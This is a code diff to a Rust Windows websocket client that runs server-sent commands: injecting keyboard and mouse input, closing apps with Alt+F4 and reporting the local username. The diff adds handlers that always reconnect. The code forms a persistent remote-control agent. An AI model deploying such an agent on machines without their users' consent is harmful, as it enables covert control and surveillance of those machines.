@@ -6,9 +6,9 @@
 use std::{pin::Pin, process::Command, time::Duration};
 
 use log::{error, info, trace, warn};
-use windows::Win32::UI::{Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, INPUT_MOUSE, KEYBDINPUT, KEYBD_EVENT_FLAGS, KEYEVENTF_KEYUP, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT, VK_CAPITAL, VK_F4, VK_L, VK_LWIN, VK_MENU}, WindowsAndMessaging::SetCursorPos};
+use windows::Win32::UI::{Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, INPUT_MOUSE, KEYBDINPUT, KEYBD_EVENT_FLAGS, KEYEVENTF_KEYUP, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT, VK_CAPITAL, VK_F4, VK_L, VK_LWIN, VK_MENU}, WindowsAndMessaging::{LockSetForegroundWindow, SetCursorPos}};
 use async_trait::async_trait;
-use ezsockets::{client::ClientCloseMode, ClientConfig, CloseFrame};
+use ezsockets::{client::ClientCloseMode, ClientConfig, CloseFrame, WSError};
 
 mod actions;
 
@@ -26,6 +26,7 @@ impl ezsockets::ClientExt for Client {
         if text == "ping" {
             let username = std::env::var("USERNAME").unwrap();
             let _ = self.handle.text(format!("username={username}"));
+            return Ok(());
         }
         // messages should be in the following format: key=val;key2=val2;
         let parts: Vec<&str> =  text.split(";").collect();  
@@ -70,6 +71,7 @@ impl ezsockets::ClientExt for Client {
                 }
                 "close" => {
                     info!("Closing app");
+                
                     actions::alt_f4();
                     let _ = self.handle.text("ok".to_string());
                 }
@@ -143,6 +145,16 @@ impl ezsockets::ClientExt for Client {
         Ok(())
     }
 
+    async fn on_disconnect(&mut self) -> Result<ClientCloseMode, ezsockets::Error> {
+        warn!("Disconnected");
+        Ok(ClientCloseMode::Reconnect)
+    }
+
+    async fn on_connect_fail(&mut self, _error: WSError) -> Result<ClientCloseMode, ezsockets::Error> {
+        warn!("Failed to connect");
+        Ok(ClientCloseMode::Reconnect)
+    }
+
     async fn on_call(&mut self, call: Self::Call) -> Result<(), ezsockets::Error> {
         let () = call;
         Ok(())
@@ -165,7 +177,6 @@ impl ezsockets::ClientExt for Client {
         'life0: 'async_trait,
     {
         warn!("Lost connection to server");
-
         Box::pin(async { Ok(ClientCloseMode::Reconnect) })
     }
 
